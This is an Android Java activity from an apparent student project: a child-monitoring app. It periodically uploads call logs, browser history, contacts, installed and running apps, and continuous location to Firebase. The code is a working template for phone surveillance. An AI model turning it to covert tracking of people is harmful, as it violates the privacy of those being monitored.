package com.example.finalproject.Activities;


import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import android.Manifest;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;

import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.example.finalproject.Fragments.HomeFragment;
import com.example.finalproject.FusedLocation;
import com.example.finalproject.Models.CallLogModel;
import com.example.finalproject.Models.ContactListModel;
import com.example.finalproject.Models.HistoryModel;
import com.example.finalproject.Models.LocationModel;
import com.example.finalproject.R;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GoogleApiAvailability;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import static com.example.finalproject.Utils.Utils.getAllHistoryData;
import static com.example.finalproject.Utils.Utils.getContactList;

public class Children extends AppCompatActivity implements GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {


    private Location location;
    private TextView locationTv;
    private GoogleApiClient googleApiClient;
    private static final int PLAY_SERVICES_RESOLUTION_REQUEST = 9000;
    private LocationRequest locationRequest;
    private static final long UPDATE_INTERVAL = 5000, FASTEST_INTERVAL = 5000; // = 5 seconds
    // lists for permissions
    private ArrayList<String> permissionsToRequest;
    private ArrayList<String> permissionsRejected = new ArrayList<>();
    private ArrayList<String> permissions = new ArrayList<>();
    // integer for permissions results request
    private static final int ALL_PERMISSIONS_RESULT = 1011;




    DatabaseReference databaseLocation,databaseCallLog,databaseHistory,databaseInstalledApps,databaseRunApps,databaseContactList;
    LocationManager locationManager;
    String locationText = "";
    Integer clearInterval=24*60*60;
    String locationLatitude = "";
    String locationLongitude = "";
    Button button;
    private int mInterval = 3000; // 3 seconds by default, can be changed later
    private Handler mHandler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_children);

        FirebaseAuth firebaseAuth = FirebaseAuth.getInstance();
        FirebaseUser firebaseUser = firebaseAuth.getCurrentUser();
        databaseLocation = FirebaseDatabase.getInstance().getReference("Location").child(firebaseUser.getUid());
        databaseCallLog = FirebaseDatabase.getInstance().getReference("CallLog").child(firebaseUser.getUid());
        databaseHistory = FirebaseDatabase.getInstance().getReference("History").child(firebaseUser.getUid());
        databaseInstalledApps = FirebaseDatabase.getInstance().getReference("InstalledApp").child(firebaseUser.getUid());
        databaseRunApps = FirebaseDatabase.getInstance().getReference("RuningApp").child(firebaseUser.getUid());
        databaseContactList = FirebaseDatabase.getInstance().getReference("ContactList").child(firebaseUser.getUid());



        /*final Handler clearData=new Handler();
        clearData.postDelayed(new Runnable() {
            @Override
            public void run() {
                ClearLocationDatabase();
                ///Cursor curLog = com.example.authapplication.CallLogHelper.getAllCallLogs(getContentResolver());
                ///setCallLogs(curLog);
                clearData.postDelayed(this, clearInterval);
            }
        }, clearInterval);*/


        ///location Code
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);

        permissionsToRequest = permissionsToRequest(permissions);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (permissionsToRequest.size() > 0) {
                requestPermissions(permissionsToRequest.toArray(
                        new String[permissionsToRequest.size()]), ALL_PERMISSIONS_RESULT);
            }
        }

        // we build google api client
        googleApiClient = new GoogleApiClient.Builder(this).
                addApi(LocationServices.API).
                addConnectionCallbacks(this).
                addOnConnectionFailedListener(this).build();


        final Handler dataEntry=new Handler();
        dataEntry.postDelayed(new Runnable() {
            @Override
            public void run() {
                ClearDatabase();
                Cursor curLog = com.example.finalproject.Utils.Utils.getAllCallLogs(getContentResolver());
                setCallLogs(curLog);
                setHistoryData();
                installedApps();
                RunApps();
                setContactListData();
                ///getLocation();

                ///Cursor curLog = com.example.authapplication.CallLogHelper.getAllCallLogs(getContentResolver());
                ///setCallLogs(curLog);
                dataEntry.postDelayed(this, 10000);
            }
        }, 10000);



    }

    private ArrayList<String> permissionsToRequest(ArrayList<String> wantedPermissions) {
        ArrayList<String> result = new ArrayList<>();

        for (String perm : wantedPermissions) {
            if (!hasPermission(perm)) {
                result.add(perm);
            }
        }

        return result;
    }

    private boolean hasPermission(String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
        }

        return true;
    }
    @Override
    protected void onStart() {
        super.onStart();

        if (googleApiClient != null) {
            googleApiClient.connect();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (!checkPlayServices()) {
            locationTv.setText("You need to install Google Play Services to use the App properly");
        }
    }

    @Override
    protected void onPause() {
        super.onPause();

        // stop location updates
        if (googleApiClient != null  &&  googleApiClient.isConnected()) {
            LocationServices.FusedLocationApi.removeLocationUpdates(googleApiClient, this);
            googleApiClient.disconnect();
        }
    }

    private boolean checkPlayServices() {
        GoogleApiAvailability apiAvailability = GoogleApiAvailability.getInstance();
        int resultCode = apiAvailability.isGooglePlayServicesAvailable(this);

        if (resultCode != ConnectionResult.SUCCESS) {
            if (apiAvailability.isUserResolvableError(resultCode)) {
                apiAvailability.getErrorDialog(this, resultCode, PLAY_SERVICES_RESOLUTION_REQUEST);
            } else {
                finish();
            }

            return false;
        }

        return true;
    }

    @Override
    public void onConnected(@Nullable Bundle bundle) {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                &&  ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        // Permissions ok, we get last location
        location = LocationServices.FusedLocationApi.getLastLocation(googleApiClient);

        if (location != null) {
            Toast.makeText(this,"Latitude : " + location.getLatitude() + "\nLongitude : " + location.getLongitude(),Toast.LENGTH_SHORT).show();
            /// locationTv.setText("Latitude : " + location.getLatitude() + "\nLongitude : " + location.getLongitude());
        }

        startLocationUpdates();
    }

    @Override
    public void onConnectionSuspended(int i) {

    }

    public void installedApps()
    {
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i=0; i < packList.size(); i++)
        {
            PackageInfo packInfo = packList.get(i);
            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
            {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                ///Toast.makeText(this,appName,Toast.LENGTH_SHORT).show();
                String id = databaseInstalledApps.push().getKey();
                databaseInstalledApps.child(id).setValue(appName);
            }
        }
    }

    private void setContactListData() {
        List<ContactListModel> contactlList = new ArrayList<>();
        contactlList = getContactList(getContentResolver());

        for(ContactListModel obj:contactlList){
            String id = databaseContactList.push().getKey();
            ContactListModel object = new ContactListModel(obj.getName(),obj.getNumber());
            databaseContactList.child(id).setValue(object);
        }


    }



    private void setHistoryData(){
        List<HistoryModel> historyModelList = new ArrayList<>();
        historyModelList = getAllHistoryData(getContentResolver());

        for(HistoryModel obj:historyModelList){
            String id = databaseHistory.push().getKey();
            HistoryModel object = new HistoryModel(obj.getDomain(),obj.getUrl());
            databaseHistory.child(id).setValue(object);
        }

     }


    private void setCallLogs(Cursor curLog) {
        int i=0;
        while (curLog.moveToNext()) {
            if(i==15) break;
            i++;
            String callNumber = curLog.getString(curLog
                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
            ///conNumbers.add(callNumber);
            ///Toast.makeText(this,callNumber,Toast.LENGTH_SHORT).show();

            String callName = curLog
                    .getString(curLog
                            .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
            if (callName == null)
                callName="Unknown";


            String callDate = curLog.getString(curLog
                    .getColumnIndex(android.provider.CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat(
                    "dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
            ///Toast.makeText(this,dateString,Toast.LENGTH_SHORT).show();

            String callType = curLog.getString(curLog
                    .getColumnIndex(android.provider.CallLog.Calls.TYPE));
            if (callType.equals("1")) {
                callType = "Incoming";
            } else
                callType = "Outgoing";

            String duration = curLog.getString(curLog
                    .getColumnIndex(android.provider.CallLog.Calls.DURATION));
            duration = "( " + duration + "sec )";

             ///Toast.makeText(this,callName,Toast.LENGTH_SHORT).show();
             String id = databaseCallLog.push().getKey();
             CallLogModel object = new CallLogModel(callNumber,callName,duration,callType,dateString);
             databaseCallLog.child(id).setValue(object);
        }
        ///Toast.makeText(this,"Call Done",Toast.LENGTH_SHORT).show();
    }

    private void RunApps()
    {
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> runningAppProcessInfo = am.getRunningAppProcesses();
        Toast.makeText(this,"RunApps",Toast.LENGTH_SHORT).show();
        for (int i = 0; i < runningAppProcessInfo.size(); i++) {
            String name = runningAppProcessInfo.get(i).processName;
            ///Toast.makeText(this,name,Toast.LENGTH_SHORT).show();

            if(name.lastIndexOf("facebook")>=0)
            {
                ///Toast.makeText(this,name,Toast.LENGTH_SHORT).show();
                databaseRunApps.setValue("facebook");break;
            }
            if(name.lastIndexOf("youtube")>=0)
            {
                /// Toast.makeText(this,name,Toast.LENGTH_SHORT).show();cnt++;
                databaseRunApps.setValue("youtube");break;
            }
            if(name.lastIndexOf("chrome")>=0)
            {
                /// Toast.makeText(this,name,Toast.LENGTH_SHORT).show();cnt++;
                databaseRunApps.setValue("chrome");break;
            }
            if(name.lastIndexOf("Twitter")>=0)
            {
                /// Toast.makeText(this,name,Toast.LENGTH_SHORT).show();cnt++;
                databaseRunApps.setValue("Twitter");break;
            }
            if(name.lastIndexOf("gallery")>=0)
            {
                /// Toast.makeText(this,name,Toast.LENGTH_SHORT).show();cnt++;
                databaseRunApps.setValue("gallery");break;
            }
            if(name.lastIndexOf("Twitter")>=0)
            {
                /// Toast.makeText(this,name,Toast.LENGTH_SHORT).show();cnt++;
                databaseRunApps.setValue("Twitter");break;
            }
            if(name.lastIndexOf("ubercab")>=0)
            {
                /// Toast.makeText(this,name,Toast.LENGTH_SHORT).show();cnt++;
                databaseRunApps.setValue("ubercab");break;
            }
        }

    }





    private void ClearLocationDatabase(){
        DatabaseReference dbinstallapps = FirebaseDatabase.getInstance().getReference().child("Location").child(FirebaseAuth.getInstance().getCurrentUser().getUid());
        dbinstallapps.setValue(null);
    }

    private void ClearDatabase(){
        String s = FirebaseAuth.getInstance().getCurrentUser().getUid();
        DatabaseReference dbhistory = FirebaseDatabase.getInstance().getReference().child("History").child(s);
        DatabaseReference dbcallLogs = FirebaseDatabase.getInstance().getReference().child("CallLog").child(s);
        DatabaseReference dbinstallapp = FirebaseDatabase.getInstance().getReference().child("InstalledApp").child(s);
        DatabaseReference dbcontact = FirebaseDatabase.getInstance().getReference().child("ContactList").child(s);

        dbhistory.setValue(null);
        dbinstallapp.setValue(null);
        dbcallLogs.setValue(null);
        dbcontact.setValue(null);
        ///Toast.makeText(this,"deleted!!",Toast.LENGTH_SHORT).show();
    }



    private void startLocationUpdates() {
        locationRequest = new LocationRequest();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationRequest.setInterval(UPDATE_INTERVAL);
        locationRequest.setFastestInterval(FASTEST_INTERVAL);

        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                &&  ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "You need to enable permissions to display location !", Toast.LENGTH_SHORT).show();
        }

        LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, locationRequest, this);
    }

    @Override
    public void onLocationChanged(Location location) {
        if (location != null) {
            Toast.makeText(this,"Latitude : " + location.getLatitude() + "\nLongitude : " + location.getLongitude(),Toast.LENGTH_SHORT).show();

            locationText = location.getLatitude() + "," + location.getLongitude();
            locationLatitude = location.getLatitude() + "";
            locationLongitude = location.getLongitude() + "";
            String id = databaseLocation.push().getKey();
            LocationModel object = new LocationModel(locationLongitude,locationLatitude);
            databaseLocation.child(id).setValue(object);

        }else{
            locationLongitude = "91.974266";
            locationLatitude="22.463751";
        }
    }

/*
    @Override
    public void onLocationChanged(Location location) {
        locationText = location.getLatitude() + "," + location.getLongitude();
        locationLatitude = location.getLatitude() + "";
        locationLongitude = location.getLongitude() + "";
        if(locationLongitude.equals("") && locationLatitude.equals("")){
            locationLongitude = "91.974266";
            locationLatitude="22.463751";
        }
        String id = databaseLocation.push().getKey();
        LocationModel object = new LocationModel(locationLongitude,locationLatitude);
        databaseLocation.child(id).setValue(object);

    }
*/


    @Override
    public void onPointerCaptureChanged(boolean hasCapture) {

    }

    @Override
    public void onBackPressed() {
        finish();
    }

    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch(requestCode) {
            case ALL_PERMISSIONS_RESULT:
                for (String perm : permissionsToRequest) {
                    if (!hasPermission(perm)) {
                        permissionsRejected.add(perm);
                    }
                }

                if (permissionsRejected.size() > 0) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (shouldShowRequestPermissionRationale(permissionsRejected.get(0))) {
                            new AlertDialog.Builder(Children.this).
                                    setMessage("These permissions are mandatory to get your location. You need to allow them.").
                                    setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialogInterface, int i) {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                requestPermissions(permissionsRejected.
                                                        toArray(new String[permissionsRejected.size()]), ALL_PERMISSIONS_RESULT);
                                            }
                                        }
                                    }).setNegativeButton("Cancel", null).create().show();

                            return;
                        }
                    }
                } else {
                    if (googleApiClient != null) {
                        googleApiClient.connect();
                    }
                }

                break;
        }
    }
}

